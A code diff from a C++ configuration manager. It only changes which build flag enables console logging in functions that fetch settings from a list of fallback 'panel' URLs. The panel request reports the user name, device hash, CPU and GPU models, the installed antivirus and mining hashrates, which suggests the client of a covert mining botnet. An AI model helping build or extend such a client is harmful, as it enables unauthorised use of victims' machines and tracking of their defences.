@@ -41,7 +41,7 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
         return false;
     }
     
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[*] Trying " << urls.size() << " panel URL(s) with fallback support" << std::endl;
 #endif
     
@@ -49,12 +49,12 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
     for (size_t i = 0; i < urls.size(); i++) {
         std::wstring wurl(urls[i].begin(), urls[i].end());
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] Attempting connection to panel " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
 #endif
         
         if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
 #endif
             return true;
@@ -62,7 +62,7 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
         
         // If this wasn't the last URL, wait before trying next
         if (i < urls.size() - 1) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
 #endif
             std::this_thread::sleep_for(std::chrono::seconds(3));
@@ -99,7 +99,7 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
         return false;
     }
     
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[*] Trying " << urls.size() << " config URL(s) with fallback support" << std::endl;
 #endif
     
@@ -107,12 +107,12 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
     for (size_t i = 0; i < urls.size(); i++) {
         std::wstring wurl(urls[i].begin(), urls[i].end());
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] Attempting GET request to config URL " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
 #endif
         
         if (FetchConfigFromUrlDirect(wurl)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[+] Successfully fetched config from: " << urls[i] << std::endl;
 #endif
             return true;
@@ -120,7 +120,7 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
         
         // If this wasn't the last URL, wait before trying next
         if (i < urls.size() - 1) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
 #endif
             std::this_thread::sleep_for(std::chrono::seconds(3));
@@ -139,7 +139,7 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
 
 bool ConfigManager::FetchConfigFromUrlDirect(const std::wstring& configUrl) {
     try {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] Fetching configuration directly from URL..." << std::endl;
 #endif
         
@@ -151,7 +151,7 @@ bool ConfigManager::FetchConfigFromUrlDirect(const std::wstring& configUrl) {
             return false;
         }
 
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Config response: " << response << std::endl;
 #endif
 
